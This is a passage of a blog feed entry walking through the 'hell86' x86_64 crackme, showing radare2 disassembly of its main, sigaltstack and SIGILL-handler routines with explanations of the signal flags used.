<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>h4x5p4c3's blog</title><link>/</link><description>Recent content on h4x5p4c3's blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><copyright>Copyright ©️ 2022</copyright><lastBuildDate>Tue, 13 Apr 2021 00:00:00 +0000</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml"/><item><title>hell86</title><link>/posts/hell86/</link><pubDate>Tue, 13 Apr 2021 00:00:00 +0000</pubDate><guid>/posts/hell86/</guid><description>Author : ttlhacker challenge files Description : x86_64 linux binary (tested on debian 9 and ubuntu 18.04, should run on any distro). Takes one command line argument and outputs &amp;ldquo;OK!&amp;rdquo; if it&amp;rsquo;s correct, &amp;ldquo;Wrong&amp;rdquo; if it&amp;rsquo;s not. Partially written in C, actual verification routine is assembly. Don&amp;rsquo;t patch the binary, of course - find the correct input.
Lets open the binary in radare2 and we&amp;rsquo;ll look at the disassembly of the main function</description><content>&lt;ul>
&lt;li>Author : ttlhacker &lt;a href="https://crackmes.one/crackme/5bc0fe0033c5d4110a29b296">challenge files&lt;/a>&lt;/li>
&lt;/ul>
&lt;blockquote>
&lt;p>Description : x86_64 linux binary (tested on debian 9 and ubuntu 18.04, should run on any distro).
Takes one command line argument and outputs &amp;ldquo;OK!&amp;rdquo; if it&amp;rsquo;s correct, &amp;ldquo;Wrong&amp;rdquo; if it&amp;rsquo;s not. Partially written in C, actual verification routine is assembly.
Don&amp;rsquo;t patch the binary, of course - find the correct input.&lt;/p>
&lt;/blockquote>
&lt;p>Lets open the binary in radare2 and we&amp;rsquo;ll look at the disassembly of the main function&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="color:#960050;background-color:#1e0010">┌&lt;/span> &lt;span style="color:#ae81ff">110&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> main (&lt;span style="color:#66d9ef">int&lt;/span> argc, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>argv);
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> ; arg &lt;span style="color:#66d9ef">int&lt;/span> argc &lt;span style="color:#960050;background-color:#1e0010">@&lt;/span> rdi
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> ; arg &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>argv &lt;span style="color:#960050;background-color:#1e0010">@&lt;/span> rsi
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x00000fc0&lt;/span> &lt;span style="color:#ae81ff">55&lt;/span> push rbp ; [&lt;span style="color:#ae81ff">14&lt;/span>] &lt;span style="color:#f92672">-&lt;/span>r&lt;span style="color:#f92672">-&lt;/span>x section size &lt;span style="color:#ae81ff">4002&lt;/span> named .text
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x00000fc1&lt;/span> &lt;span style="color:#ae81ff">53&lt;/span> push rbx
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x00000fc2&lt;/span> &lt;span style="color:#ae81ff">4889f&lt;/span>&lt;span style="color:#ae81ff">5&lt;/span> mov rbp, rsi ; argv
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x00000fc5&lt;/span> &lt;span style="color:#ae81ff">89f&lt;/span>b mov ebx, edi ; argc
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x00000fc7&lt;/span> &lt;span style="color:#ae81ff">4883&lt;/span>ec08 sub rsp, &lt;span style="color:#ae81ff">8&lt;/span>
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x00000fcb&lt;/span> e8f6090000 call sigaltstack
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x00000fd0&lt;/span> &lt;span style="color:#ae81ff">84&lt;/span>c0 test al, al
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x00000fd2&lt;/span> ba01000000 mov edx, &lt;span style="color:#ae81ff">1&lt;/span>
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">┌─&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0x00000fd7&lt;/span> &lt;span style="color:#ae81ff">744f&lt;/span> je &lt;span style="color:#ae81ff">0x1028&lt;/span>
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x00000fd9&lt;/span> e887090000 call sigill_handler
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x00000fde&lt;/span> &lt;span style="color:#ae81ff">84&lt;/span>c0 test al, al
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x00000fe0&lt;/span> ba02000000 mov edx, &lt;span style="color:#ae81ff">2&lt;/span>
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">┌──&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0x00000fe5&lt;/span> &lt;span style="color:#ae81ff">7441&lt;/span> je &lt;span style="color:#ae81ff">0x1028&lt;/span>
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">││&lt;/span> &lt;span style="color:#ae81ff">0x00000fe7&lt;/span> &lt;span style="color:#ae81ff">4863f&lt;/span>b movsxd rdi, ebx
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">││&lt;/span> &lt;span style="color:#ae81ff">0x00000fea&lt;/span> &lt;span style="color:#ae81ff">4889&lt;/span>ee mov rsi, rbp
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">││&lt;/span> &lt;span style="color:#ae81ff">0x00000fed&lt;/span> e89e010000 call flag_verification
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">││&lt;/span> &lt;span style="color:#ae81ff">0x00000ff2&lt;/span> &lt;span style="color:#ae81ff">4883f&lt;/span>&lt;span style="color:#ae81ff">801&lt;/span> cmp rax, &lt;span style="color:#ae81ff">1&lt;/span>
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">││&lt;/span> &lt;span style="color:#ae81ff">0x00000ff6&lt;/span> &lt;span style="color:#ae81ff">488&lt;/span>d3dda1000. lea rdi, str.Wrong ; &lt;span style="color:#ae81ff">0x20d7&lt;/span> ; &lt;span style="color:#e6db74">&amp;#34;Wrong&amp;#34;&lt;/span>
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">┌───&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0x00000ffd&lt;/span> &lt;span style="color:#ae81ff">7422&lt;/span> je &lt;span style="color:#ae81ff">0x1021&lt;/span>
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">│││&lt;/span> &lt;span style="color:#ae81ff">0x00000fff&lt;/span> &lt;span style="color:#ae81ff">4883f&lt;/span>&lt;span style="color:#ae81ff">802&lt;/span> cmp rax, &lt;span style="color:#ae81ff">2&lt;/span>
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">│││&lt;/span> &lt;span style="color:#ae81ff">0x00001003&lt;/span> &lt;span style="color:#ae81ff">488&lt;/span>d3dd31000. lea rdi, str.hell86_crackme__Please_pass_the_flag_as_a_command_line_argument. ; &lt;span style="color:#ae81ff">0x20dd&lt;/span> ; &lt;span style="color:#e6db74">&amp;#34;[hell86 crackme] Please pass the flag as a command-line argument.&amp;#34;&lt;/span>
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">┌────&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0x0000100a&lt;/span> &lt;span style="color:#ae81ff">7415&lt;/span> je &lt;span style="color:#ae81ff">0x1021&lt;/span>
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">││││&lt;/span> &lt;span style="color:#ae81ff">0x0000100c&lt;/span> &lt;span style="color:#ae81ff">4885&lt;/span>c0 test rax, rax
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">││││&lt;/span> &lt;span style="color:#ae81ff">0x0000100f&lt;/span> &lt;span style="color:#ae81ff">488&lt;/span>d3dbd1000. lea rdi, [&lt;span style="color:#ae81ff">0x000020d3&lt;/span>] ; &lt;span style="color:#e6db74">&amp;#34;OK!&amp;#34;&lt;/span>
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">││││&lt;/span> &lt;span style="color:#ae81ff">0x00001016&lt;/span> &lt;span style="color:#ae81ff">488&lt;/span>d05021100. lea rax, str.You_have_encountered_a_bug ; &lt;span style="color:#ae81ff">0x211f&lt;/span> ; &lt;span style="color:#e6db74">&amp;#34;You have encountered a bug&amp;#34;&lt;/span>
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">││││&lt;/span> &lt;span style="color:#ae81ff">0x0000101d&lt;/span> &lt;span style="color:#ae81ff">480f45f&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span> cmovne rdi, rax
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">││││&lt;/span> ; CODE XREFS from main &lt;span style="color:#960050;background-color:#1e0010">@&lt;/span> &lt;span style="color:#ae81ff">0xffd&lt;/span>, &lt;span style="color:#ae81ff">0x100a&lt;/span>
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">└└───&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0x00001021&lt;/span> e80affffff call sym.imp.puts ; &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">puts&lt;/span>(&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>s)
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">││&lt;/span> &lt;span style="color:#ae81ff">0x00001026&lt;/span> &lt;span style="color:#ae81ff">31&lt;/span>d2 xor edx, edx
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">││&lt;/span> ; CODE XREFS from main &lt;span style="color:#960050;background-color:#1e0010">@&lt;/span> &lt;span style="color:#ae81ff">0xfd7&lt;/span>, &lt;span style="color:#ae81ff">0xfe5&lt;/span>
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">└└─&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0x00001028&lt;/span> &lt;span style="color:#ae81ff">89&lt;/span>d0 mov eax, edx
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x0000102a&lt;/span> &lt;span style="color:#ae81ff">5&lt;/span>a pop rdx
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x0000102b&lt;/span> &lt;span style="color:#ae81ff">5&lt;/span>b pop rbx
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x0000102c&lt;/span> &lt;span style="color:#ae81ff">5&lt;/span>d pop rbp
&lt;span style="color:#960050;background-color:#1e0010">└&lt;/span> &lt;span style="color:#ae81ff">0x0000102d&lt;/span> c3 ret
&lt;/code>&lt;/pre>&lt;/div>&lt;p>The main function calls 3 functions respectively&lt;/p>
&lt;h2 id="sigaltstack-function">sigaltstack function&lt;/h2>
&lt;p>The first function allocates 0x2000 bytes on the heap for an alternate stack for the signal handlers and the stack pointer points to the new stack which had been allocated also the flags have been set to 0 and later on it calls the sigaltstack function and if it encounters any errors it free&amp;rsquo;s the allocated memory.&lt;/p>
&lt;p>This is an example for defining an alternate stack&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c"> &lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;signal.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">&lt;/span> ...
&lt;span style="color:#66d9ef">if&lt;/span> ((sigstk.ss_sp &lt;span style="color:#f92672">=&lt;/span> malloc(SIGSTKSZ)) &lt;span style="color:#f92672">==&lt;/span> NULL)
&lt;span style="color:#75715e">/* Error return. */&lt;/span>
sigstk.ss_size &lt;span style="color:#f92672">=&lt;/span> SIGSTKSZ;
sigstk.ss_flags &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;span style="color:#66d9ef">if&lt;/span> (sigaltstack(&lt;span style="color:#f92672">&amp;amp;&lt;/span>sigstk,(stack_t &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)
perror(&lt;span style="color:#e6db74">&amp;#34;sigaltstack&amp;#34;&lt;/span>);
&lt;/code>&lt;/pre>&lt;/div>&lt;p>The actual function&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="color:#960050;background-color:#1e0010">┌&lt;/span> &lt;span style="color:#ae81ff">89&lt;/span>&lt;span style="color:#f92672">:&lt;/span> sigaltstack ();
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> ; var &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>var_8h &lt;span style="color:#960050;background-color:#1e0010">@&lt;/span> rsp&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x8&lt;/span>
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> ; var &lt;span style="color:#66d9ef">int64_t&lt;/span> var_18h &lt;span style="color:#960050;background-color:#1e0010">@&lt;/span> rsp&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x18&lt;/span>
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x000019c6&lt;/span> &lt;span style="color:#ae81ff">53&lt;/span> push rbx
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x000019c7&lt;/span> bf00200000 mov edi, &lt;span style="color:#ae81ff">0x2000&lt;/span> ; &lt;span style="color:#e6db74">&amp;#34;X&lt;/span>&lt;span style="color:#ae81ff">\xbb\xff\xff\xff\xff\xff\xff\xb8\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> ; size_t size
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x000019cc&lt;/span> &lt;span style="color:#ae81ff">4883&lt;/span>ec20 sub rsp, &lt;span style="color:#ae81ff">0x20&lt;/span>
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x000019d0&lt;/span> e87bf5ffff call sym.imp.malloc ; &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#a6e22e">malloc&lt;/span>(size_t size)
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x000019d5&lt;/span> &lt;span style="color:#ae81ff">31&lt;/span>d2 xor edx, edx
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x000019d7&lt;/span> &lt;span style="color:#ae81ff">4885&lt;/span>c0 test rax, rax
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">┌─&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0x000019da&lt;/span> &lt;span style="color:#ae81ff">743&lt;/span>b je &lt;span style="color:#ae81ff">0x1a17&lt;/span>
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x000019dc&lt;/span> &lt;span style="color:#ae81ff">488&lt;/span>d7c2408 lea rdi, [var_8h]
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x000019e1&lt;/span> &lt;span style="color:#ae81ff">4889&lt;/span>c3 mov rbx, rax
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x000019e4&lt;/span> b906000000 mov ecx, &lt;span style="color:#ae81ff">6&lt;/span>
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x000019e9&lt;/span> &lt;span style="color:#ae81ff">31&lt;/span>c0 xor eax, eax
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x000019eb&lt;/span> &lt;span style="color:#ae81ff">31f&lt;/span>&lt;span style="color:#ae81ff">6&lt;/span> xor esi, esi
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x000019ed&lt;/span> f3ab rep stosd dword [rdi], eax
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x000019ef&lt;/span> &lt;span style="color:#ae81ff">488&lt;/span>d7c2408 lea rdi, [var_8h]
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x000019f4&lt;/span> &lt;span style="color:#ae81ff">48&lt;/span>c744241800. mov qword [var_18h], &lt;span style="color:#ae81ff">0x2000&lt;/span> ; [&lt;span style="color:#ae81ff">0x2000&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>]&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0xffffffffffffbb58&lt;/span> ; &lt;span style="color:#e6db74">&amp;#34;X&lt;/span>&lt;span style="color:#ae81ff">\xbb\xff\xff\xff\xff\xff\xff\xb8\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x000019fd&lt;/span> &lt;span style="color:#ae81ff">48895&lt;/span>c2408 mov qword [var_8h], rbx
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x00001a02&lt;/span> e899f5ffff call sym.imp.sigaltstack
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x00001a07&lt;/span> &lt;span style="color:#ae81ff">85&lt;/span>c0 test eax, eax
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x00001a09&lt;/span> b201 mov dl, &lt;span style="color:#ae81ff">1&lt;/span>
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">┌──&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0x00001a0b&lt;/span> &lt;span style="color:#ae81ff">740&lt;/span>a je &lt;span style="color:#ae81ff">0x1a17&lt;/span>
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">││&lt;/span> &lt;span style="color:#ae81ff">0x00001a0d&lt;/span> &lt;span style="color:#ae81ff">4889&lt;/span>df mov rdi, rbx ; &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>ptr
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">││&lt;/span> &lt;span style="color:#ae81ff">0x00001a10&lt;/span> e86bf5ffff call sym.imp.free ; &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">free&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>ptr)
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">││&lt;/span> &lt;span style="color:#ae81ff">0x00001a15&lt;/span> &lt;span style="color:#ae81ff">31&lt;/span>d2 xor edx, edx
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">││&lt;/span> ; CODE XREFS from sigaltstack &lt;span style="color:#960050;background-color:#1e0010">@&lt;/span> &lt;span style="color:#ae81ff">0x19da&lt;/span>, &lt;span style="color:#ae81ff">0x1a0b&lt;/span>
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">└└─&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0x00001a17&lt;/span> &lt;span style="color:#ae81ff">4883&lt;/span>c420 add rsp, &lt;span style="color:#ae81ff">0x20&lt;/span>
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x00001a1b&lt;/span> &lt;span style="color:#ae81ff">88&lt;/span>d0 mov al, dl
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x00001a1d&lt;/span> &lt;span style="color:#ae81ff">5&lt;/span>b pop rbx
&lt;span style="color:#960050;background-color:#1e0010">└&lt;/span> &lt;span style="color:#ae81ff">0x00001a1e&lt;/span> c3 ret
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="sigill-handler">sigill handler&lt;/h2>
&lt;p>This function initializes the &lt;code>SIGILL&lt;/code> handler it has two flags set &lt;code>SA_ONSTACK&lt;/code> and &lt;code>SA_SIGINFO&lt;/code> what does these flags do ????&lt;/p>
&lt;p>The man page for sigaction clearly mentions that :&lt;/p>
&lt;p>SA_ONSTACK If set and an alternate signal stack has been declared with sigaltstack(), the signal shall be delivered to the calling process on that stack.
Otherwise, the signal shall be delivered on the current stack.&lt;/p>
&lt;p>SA_SIGINFO If cleared and the signal is caught, the signal-catching function shall be entered as:&lt;/p>
&lt;p>void func(int signo);&lt;/p>
&lt;p>where signo is the only argument to the signal-catching function. In this case, the application shall use the sa_handler member to describe
the signal-catching function and the application shall not modify the sa_sigaction member.&lt;/p>
&lt;p>If SA_SIGINFO is set and the signal is caught, the signal-catching function shall be entered as:&lt;/p>
&lt;p>void func(int signo, siginfo_t *info, void *context);&lt;/p>
&lt;p>where two additional arguments are passed to the signal-catching function. The second argument shall point to an object of type siginfo_t explaining the reason why the signal was generated; the third argument can be cast to a pointer to an object of type ucontext_t to refer to the receiving thread&amp;rsquo;s context that was interrupted when the signal was delivered. In this case, the application shall use the sa_sigaction member to describe the signal-catching function and the application shall not modify the sa_handler member.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="color:#960050;background-color:#1e0010">┌&lt;/span> &lt;span style="color:#ae81ff">97&lt;/span>&lt;span style="color:#f92672">:&lt;/span> sigill_handler ();
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> ; var &lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">sigaction&lt;/span> &lt;span style="color:#f92672">*&lt;/span>act &lt;span style="color:#960050;background-color:#1e0010">@&lt;/span> rsp&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x8&lt;/span>
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> ; var &lt;span style="color:#66d9ef">int64_t&lt;/span> var_10h &lt;span style="color:#960050;background-color:#1e0010">@&lt;/span> rsp&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x10&lt;/span>
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> ; var &lt;span style="color:#66d9ef">int64_t&lt;/span> var_90h &lt;span style="color:#960050;background-color:#1e0010">@&lt;/span> rsp&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x90&lt;/span>
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x00001965&lt;/span> &lt;span style="color:#ae81ff">53&lt;/span> push rbx
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x00001966&lt;/span> &lt;span style="color:#ae81ff">31&lt;/span>c0 xor eax, eax
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x00001968&lt;/span> b926000000 mov ecx, &lt;span style="color:#ae81ff">0x26&lt;/span> ; &lt;span style="color:#e6db74">&amp;#39;&amp;amp;&amp;#39;&lt;/span>
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x0000196d&lt;/span> &lt;span style="color:#ae81ff">4881&lt;/span>eca00000. sub rsp, &lt;span style="color:#ae81ff">0xa0&lt;/span>
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x00001974&lt;/span> &lt;span style="color:#ae81ff">488&lt;/span>d7c2408 lea rdi, [act]
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x00001979&lt;/span> f3ab rep stosd dword [rdi], eax
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x0000197b&lt;/span> &lt;span style="color:#ae81ff">488&lt;/span>d05c4ffff. lea rax, [&lt;span style="color:#ae81ff">0x00001946&lt;/span>]
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x00001982&lt;/span> &lt;span style="color:#ae81ff">488&lt;/span>d7c2410 lea rdi, [var_10h]
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x00001987&lt;/span> c78424900000. mov dword [var_90h], &lt;span style="color:#ae81ff">0x8000004&lt;/span> ; [&lt;span style="color:#ae81ff">0x8000004&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#ae81ff">4&lt;/span>]&lt;span style="color:#f92672">=-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x00001992&lt;/span> &lt;span style="color:#ae81ff">4889442408&lt;/span> mov qword [act], rax
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x00001997&lt;/span> e8c4f5ffff call sym.imp.sigfillset
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x0000199c&lt;/span> &lt;span style="color:#ae81ff">31&lt;/span>d2 xor edx, edx
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x0000199e&lt;/span> &lt;span style="color:#ae81ff">85&lt;/span>c0 test eax, eax
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">┌─&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0x000019a0&lt;/span> &lt;span style="color:#ae81ff">7519&lt;/span> jne &lt;span style="color:#ae81ff">0x19bb&lt;/span>
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x000019a2&lt;/span> &lt;span style="color:#ae81ff">488&lt;/span>d5c2408 lea rbx, [act]
